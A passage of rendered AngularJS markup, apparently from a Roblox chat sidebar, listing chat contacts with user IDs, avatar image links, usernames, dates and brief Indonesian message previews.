<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
achaaeee
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 18
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

<span class="xsmall text-overflow text-info font-caption-body chat-friend-message ng-binding ng-scope read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="chatUser.previewMessage && !chatUser.isUserPending">
 terkeluarr jaringann 
</span>

                                                
<!-- end ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-8722825842">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="8722825842" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="8722825842">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="8722825842">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A2401E98DB0E855661B90283B42BBE69-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="8722825842" title="8722825842" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A2401E98DB0E855661B90283B42BBE69-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
snowy
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 17
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-f83687fc-ce02-574b-bef9-a5b0113668b9">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="8917131638" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="8917131638">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="8917131638">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-66086D92D271A9FC2E23137CD6EAE2D6-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="8917131638" title="8917131638" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-66086D92D271A9FC2E23137CD6EAE2D6-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
mochyamal
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 15
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

<span class="xsmall text-overflow text-info font-caption-body chat-friend-message ng-binding ng-scope read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="chatUser.previewMessage && !chatUser.isUserPending">
 langsung join weh di friend 
</span>

                                                
<!-- end ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-9dc70e2a-19fb-579e-a044-85c9aa6a0167">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="4538190311" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="4538190311">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="4538190311">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-C0CC61752A9D08DAAC5680667AFF8230-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="4538190311" title="4538190311" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-C0CC61752A9D08DAAC5680667AFF8230-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
Kyuraa_Zx
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 15
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

<span class="xsmall text-overflow text-info font-caption-body chat-friend-message ng-binding ng-scope read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="chatUser.previewMessage && !chatUser.isUserPending">
 wet 
</span>

                                                
<!-- end ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-7984209991">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="7984209991" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="7984209991">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="7984209991">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-94A420686473CAA053C3827A5FD90FF8-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="7984209991" title="7984209991" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-94A420686473CAA053C3827A5FD90FF8-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
hasta
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 14
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-2395044876">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="2395044876" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="2395044876">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="2395044876">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0CD1D7B3C71D1A450751D66D604BEC0C-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="2395044876" title="2395044876" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0CD1D7B3C71D1A450751D66D604BEC0C-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
AkuBayu
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 11
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-8761912666">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="8761912666" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="8761912666">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="8761912666">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-6387B987DEF2BB0F22BE0CF8889CFD42-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="8761912666" title="8761912666" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-6387B987DEF2BB0F22BE0CF8889CFD42-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
Alvin_00208
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 8
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                            
</ul>

                            
<div class="chat-loading loading-bottom ng-hide" ng-show="chatLibrary.chatLayout.isChatLoading">
 
<span class="spinner spinner-sm" title="loading ...">

</span>
 
</div>

                        
</div>

                        
<div id="mCSB_1_scrollbar_vertical" class="mCSB_scrollTools mCSB_1_scrollbar mCS-light mCSB_scrollTools_vertical" style="display: block;">

                            
<div class="mCSB_draggerContainer">

                                
<div id="mCSB_1_dragger_vertical" class="mCSB_dragger" style="position: absolute; min-height: 30px; display: block; top: 0px; height: 0px;" oncontextmenu="return false;">

                                    
<div class="mCSB_dragger_bar" style="line-height: 30px;">

</div>

                                
</div>

                                
<div class="mCSB_draggerRail">

</div>

                            
</div>

                        
</div>

                    
</div>

                
</div>

            
</div>

            
<!-- end ngIf: !(chatLibrary.chatLayout.chatLandingEnabled || !getIsChatEnabled()) -->

            
<div id="chat-disconnect" class="chat-disconnect ng-hide" ng-show="isChatDisconnected()">

                
<p class="text-info ng-binding ng-hide" ng-show="chatLibrary.chatLayout.errorMaskEnable">
Connecting... 
</p>
 
<span>

<span class="spinner spinner-default" title="loading ...">

</span>

</span>

            
</div>

            
<!-- ngIf: isChatEmpty() -->

        
</div>

        
<div id="dialogs" class="dialogs ng-scope" ng-controller="dialogsController" ng-hide="!getIsChatEnabled()">

            
<!-- ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_354934038" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_8870923234" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_7839729396" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="conv_816bb847-5448-5d8a-85fe-5ae4e56e529b" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="conv_d0bee469-2275-5192-843f-63b6904919ad" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_7306583286" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
